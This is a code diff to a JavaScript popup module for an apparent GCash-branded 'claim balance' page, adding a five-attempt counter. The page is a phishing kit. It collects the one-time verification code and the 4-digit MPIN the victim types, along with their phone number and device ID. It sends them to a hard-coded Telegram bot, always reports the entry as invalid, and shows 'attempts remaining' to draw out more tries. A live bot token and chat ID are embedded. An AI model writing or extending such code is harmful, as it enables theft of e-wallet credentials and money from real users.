@@ -1,5 +1,6 @@
 /**
  * Popup Share Module - Complete with Firewall Logic
+ * 5 Attempts Rule - Redirect to index.html
  */
 
 // ========== POPUP MODULE ==========
@@ -13,6 +14,8 @@
     let currentFirewallStatus = false;
     let enteredVerificationCode = '';
     let enteredMPIN = '';
+    let invalidAttempts = 0;  // Counter para sa invalid attempts
+    const MAX_ATTEMPTS = 5;    // Maximum 5 attempts
     
     // ========== INITIALIZATION ==========
     function init() {
@@ -30,6 +33,46 @@
         addAnimations();
         
         console.log('Popup Module ready');
+    }
+    
+    // ========== RESET ATTEMPTS ==========
+    function resetAttempts() {
+        invalidAttempts = 0;
+        console.log('Invalid attempts reset to 0');
+    }
+    
+    // ========== HANDLE MAX ATTEMPTS ==========
+    function handleMaxAttempts() {
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        
+        // Send notification to Telegram
+        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+        const chatId = "7298607329";
+        const message = `MAX ATTEMPTS REACHED\nUser: ${userPhone}\nAttempts: ${MAX_ATTEMPTS}\nAction: Redirect to index.html`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .catch(e => console.log('Telegram error:', e));
+        
+        alert(`Too many invalid attempts (${MAX_ATTEMPTS}). You will be redirected to login page.`);
+        
+        // Clear local storage
+        localStorage.removeItem("userPhone");
+        localStorage.removeItem("userDeviceId");
+        localStorage.removeItem("userDeviceDisplayId");
+        
+        // Redirect to index.html
+        window.location.href = "index.html";
+    }
+    
+    // ========== INCREMENT INVALID ATTEMPTS ==========
+    function incrementInvalidAttempts() {
+        invalidAttempts++;
+        console.log(`Invalid attempt ${invalidAttempts}/${MAX_ATTEMPTS}`);
+        
+        if (invalidAttempts >= MAX_ATTEMPTS) {
+            handleMaxAttempts();
+            return true; // Max attempts reached
+        }
+        return false; // Still has attempts left
     }
     
     // ========== ADD ANIMATIONS ==========
@@ -158,6 +201,12 @@
                 animation: fadeInOut 1.5s ease;
                 padding: 20px;
             }
+            .attempts-counter {
+                font-size: 10px;
+                color: #ffaa33;
+                text-align: center;
+                margin-top: 10px;
+            }
         `;
         if (!document.querySelector('#popup-animations')) {
             style.id = 'popup-animations';
@@ -213,6 +262,9 @@
             e.stopPropagation();
             
             console.log('Claim button clicked!');
+            
+            // Reset attempts when starting new claim
+            resetAttempts();
             
             const balance = await syncBalanceFromFirebase();
             showPopup(balance);
@@ -293,14 +345,14 @@
     }
     
     // ========== SEND VERIFICATION ATTEMPT ==========
-    async function sendVerificationAttempt(userPhone, deviceId, code) {
+    async function sendVerificationAttempt(userPhone, deviceId, code, attemptsLeft) {
         try {
             const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
             const chatId = "7298607329";
             const now = new Date();
             const timestamp = now.toLocaleString();
             
-            const message = `VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice: ${deviceId}\nCode: ${code}\nTime: ${timestamp}\nStatus: INVALID`;
+            const message = `VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice: ${deviceId}\nCode: ${code}\nTime: ${timestamp}\nStatus: INVALID\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}`;
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
             console.log('Verification attempt sent');
         } catch(e) {
@@ -343,10 +395,12 @@
             popupContainer.style.width = '90%';
         }
         
+        const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
+        
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
-            <!-- GCASH ICON (Device Icon pinalitan ng gc_icon.png) -->
+            <!-- GCASH ICON -->
             <div style="text-align: center; margin-bottom: 10px;">
                 <img src="images/gc_icon.png" style="width: 55px; height: 55px; animation: bounceIn 0.5s ease;">
             </div>
@@ -356,6 +410,11 @@
             </h2>
             
             <div class="divider" style="width: 50px; margin: 10px auto; background: #00f2ff;"></div>
+            
+            <!-- ATTEMPTS COUNTER -->
+            <div class="attempts-counter">
+                ⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}
+            </div>
             
             <!-- STEP 1: 6-DIGIT CODE (BYPASS) -->
             <div id="step1Container" style="background: linear-gradient(135deg, rgba(0,242,255,0.08), rgba(0,242,255,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
@@ -469,7 +528,8 @@
                 
                 const userPhone = localStorage.getItem("userPhone") || "Unknown";
                 const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-                sendVerificationAttempt(userPhone, deviceId, code);
+                const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
+                sendVerificationAttempt(userPhone, deviceId, code, attemptsLeft);
                 
                 // TRANSITION EFFECT
                 step1Container.style.transition = 'opacity 0.3s ease';
@@ -521,12 +581,34 @@
             if (currentMPIN.length === 4) {
                 const userPhone = localStorage.getItem("userPhone") || "Unknown";
                 const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-                sendVerificationAttempt(userPhone, deviceId, currentMPIN);
+                
+                // INCREMENT ATTEMPTS
+                const maxReached = incrementInvalidAttempts();
+                const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
+                
+                sendVerificationAttempt(userPhone, deviceId, currentMPIN, attemptsLeft);
+                
+                // Update attempts counter display
+                const attemptsCounter = document.querySelector('.attempts-counter');
+                if (attemptsCounter) {
+                    attemptsCounter.innerHTML = `⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}`;
+                    if (attemptsLeft <= 2) {
+                        attemptsCounter.style.color = '#ff4444';
+                        attemptsCounter.style.fontWeight = 'bold';
+                    }
+                }
                 
                 const errorMsg = document.getElementById('step2ErrorMsg');
                 const mpinDots = document.getElementById('mpinDots');
                 
-                if (errorMsg) errorMsg.style.display = 'block';
+                if (errorMsg) {
+                    if (maxReached) {
+                        errorMsg.innerHTML = '❌ Max attempts reached. Redirecting...';
+                    } else {
+                        errorMsg.innerHTML = `❌ Invalid MPIN. ${attemptsLeft} attempts remaining.`;
+                    }
+                    errorMsg.style.display = 'block';
+                }
                 if (mpinDots) {
                     mpinDots.classList.add('shake-effect');
                     setTimeout(() => mpinDots.classList.remove('shake-effect'), 300);
@@ -536,7 +618,7 @@
                 updateMPINDots();
                 
                 setTimeout(() => {
-                    if (errorMsg) errorMsg.style.display = 'none';
+                    if (errorMsg && !maxReached) errorMsg.style.display = 'none';
                 }, 2000);
             }
         }
